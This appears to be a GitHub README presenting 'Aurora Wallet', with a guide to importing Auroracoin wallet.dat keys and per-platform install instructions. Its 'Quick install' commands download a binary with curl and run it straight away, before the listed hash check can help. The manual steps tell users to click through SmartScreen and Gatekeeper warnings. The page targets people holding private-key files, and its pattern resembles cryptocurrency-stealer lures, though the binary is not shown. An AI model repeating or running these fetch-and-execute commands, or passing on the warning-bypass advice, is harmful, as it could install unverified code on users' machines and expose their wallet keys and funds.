![Aurora Wallet import wallet.dat guide](assets/aurora-wallet-guide-article-banner.png)

# How to import an Auroracoin wallet.dat into Aurora Wallet

Move the keys from a legacy file into a phrase-backed wallet without touching the original.

## Downloads - 2026.08.1.0

<p align="center"><a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`aurora-wallet-v2026.08.1.0.exe`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`aurora-wallet-v2026.08.1.0.dmg`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`aurora-wallet-v2026.08.1.0.zip`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip) |


Importing a legacy wallet file reads its keys into Aurora Wallet, and the original file stays exactly where it is.

A `wallet.dat` file from Auroracoin Core holds private keys in a format the modern wallet can read. The import copies those keys into the new wallet, which then controls the same addresses and shows the same balance. Nothing is deleted from the old file, so the migration can be reversed by reopening the old client.

<!-- ARTICLE-BODY-BEGIN -->

## Before the import

Locate the file and copy it to an external drive. The folder for each operating system is listed in <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/21-wallet-dat-location.md">where wallet.dat lives</a>, and the copy is what makes the rest of this procedure safe.

Confirm the old wallet is closed. A file in use can be read while it is being written, and a partial read imports a partial set of keys.

## The import steps

1. Copy the wallet file from the data directory to an external drive.
2. Open Aurora Wallet and let it finish syncing.
3. Open the import option in the wallet menu.
4. Select the copied file rather than the original.
5. Enter the old wallet password if the file was encrypted.
6. Wait for the import to report the keys it read.
7. Confirm that the expected addresses appear with their balances.

If the import reports fewer keys than you expect, the old wallet held addresses that were never used or generated after the last backup. Repeat the import from the newest copy of the file you have.

## What the import does not do

The import does not change the addresses, so the balance appears at the original address. It also does not create a recovery phrase for those keys: the phrase belongs to the wallet you imported into, and the imported keys are stored alongside it in the wallet file.

Combining the old keys with the new phrase means one backup covers everything after the import, which is the reason to do it rather than keep running the old client. <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/33-backup-best-practice.md">Backup best practice</a> explains how to record the result.

If the file will not read at all, <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/24-error-5-invalid-encoding.md">error 5 and invalid encoding</a> covers the message that appears when a key is malformed rather than the file being wrong.

Perform the import with the <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest">current Aurora Wallet release</a>, because the import path is one of the parts that improves between versions.

## FAQ

### Is importing the same as sweeping?

No. An import keeps the original address. A sweep moves the balance to a new address controlled by your phrase.

### Should I delete the old wallet file afterwards?

Keep it until the balance is visible in the new wallet and one test payment has confirmed. Then store it offline rather than deleting it.

<!-- ARTICLE-BODY-END -->

## How to install Aurora Wallet

### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe">aurora-wallet-v2026.08.1.0.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

Check the download: run the command below and compare the result with `f9fdc62a9566b61a1dae689b5aaa1a2df3fcb3e0270a5d2d4bd32e937b924049`.

```cmd
certutil -hashfile setup.exe SHA256
```

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg">aurora-wallet-v2026.08.1.0.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

Check the download: run the command below and compare the result with `2c0fd3f9a9c7ff4df8d10621be1b9284262b4a32109887768c259bc3fb5699f9`.

```bash
shasum -a 256 setup.dmg
```

### Linux
Quick install (Terminal):

```bash
curl -fLo app.zip https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip && unzip -o app.zip && chmod +x aurora-wallet && ./aurora-wallet
```

Manual install:
1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip">aurora-wallet-v2026.08.1.0.zip</a>.
2. Extract the archive.
3. Run `aurora-wallet`.

Check the download: run the command below and compare the result with `fcf7350d8f38256031aa2060bded8898f71cae2cd9613d19fdc0c3e37267717a`.

```bash
sha256sum app.zip
```


## Related guides

- [wallet.dat location](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/21-wallet-dat-location.md)
- [Migrate from Auroracoin Core](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/27-migrate-from-auroracoin-core.md)
- [Error 5 invalid encoding](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/24-error-5-invalid-encoding.md)
- [Backup best practice](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/33-backup-best-practice.md)
